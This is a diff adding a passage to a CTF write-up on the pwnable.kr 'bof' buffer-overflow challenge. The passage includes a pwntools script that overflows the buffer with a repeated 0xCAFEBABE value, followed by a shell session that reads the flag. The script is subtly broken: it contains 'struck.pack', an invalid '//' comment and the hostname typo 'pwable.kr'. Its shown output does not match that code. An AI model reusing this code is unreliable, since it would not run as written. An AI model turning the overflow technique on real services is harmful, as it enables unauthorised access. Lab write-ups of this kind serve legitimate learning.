@@ -214,7 +214,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 <p>Finally, I think that now we can move on and make the bof challenge.</p>
 <ul>
-    <li>http://pwnable.kr/bin/bof <em>(you can find this one in this folder)</em></li>
+    <li>http://pwnable.kr/bin/bof <em>(you can find this one in this folder as well, it's in case you would like to solve with Ida)</em></li>
     <li> http://pwnable.kr/bin/bof.c</li>
 </ul>
 
@@ -238,3 +238,50 @@ int main(int argc, char* argv[]){
 	return 0;
 }
 ``` 
+
+<p>Also, we have this infomartion: <strong>Running at : nc pwnable.kr 9000</strong></p>
+
+<p>Moreover, we need to create an interactive script in Python to access the servidor. So, I created and saved this one as bof.py:</p>
+
+```
+import struct
+from pwn import *
+
+c = remote('pwable.kr', 9000)
+payload = struck.pack('<I', 0xCAFEBABE) * 20 // "<" means byte order in 	
+little-endian and "I" means int
+c.sendline(payload)
+
+c.interactive()
+```
+
+<p>Explanation: I imported the struct packaged because it helps me to get a bytes array easily (https://docs.python.org/3/library/struct.html), and pwn package is a CTF framework and exploit development library (http://docs.pwntools.com/en/stable/).</p>
+
+<p>Then I just run the code and the magic happens</p>
+
+```
+:~$ python3 bof.py bof
+```
+
+```
+[+] Opening connection to pwnable.kr on port 9000: Done
+[*] Switching to interactive mode
+```
+
+```
+$ ls
+bof
+bof.c
+flag
+log
+log2
+super.pl
+```
+
+```
+$ cat flag
+```
+
+```
+flag here!!
+```
